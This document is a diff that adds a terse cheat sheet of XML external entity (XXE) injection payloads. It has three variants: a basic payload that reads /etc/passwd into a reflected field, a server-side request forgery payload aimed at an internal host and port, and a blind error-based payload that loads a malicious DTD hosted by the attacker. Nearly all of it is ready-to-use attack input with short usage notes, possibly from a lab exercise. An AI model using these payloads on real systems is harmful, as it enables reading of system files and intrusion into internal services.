@@ -1,0 +1,13 @@
+Basic XML:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
+Change data in reflected field to: &xxe;
+
+SSRF XML:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "<IP and Port of hiddenserver"> ] >
+Change data in reflected field to: &xxe;
+For now ip and port are 127.0.0.1:600
+
+Blind Error:
+Need to host BlindErrorExternal.dtd
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "IP, port and link to BlindErrorExternal.dtd"> %xxe; ] >
+If you are hosting on the same machine just use <Machine IP>:<PORT>/BlindErrorExternal.dtd
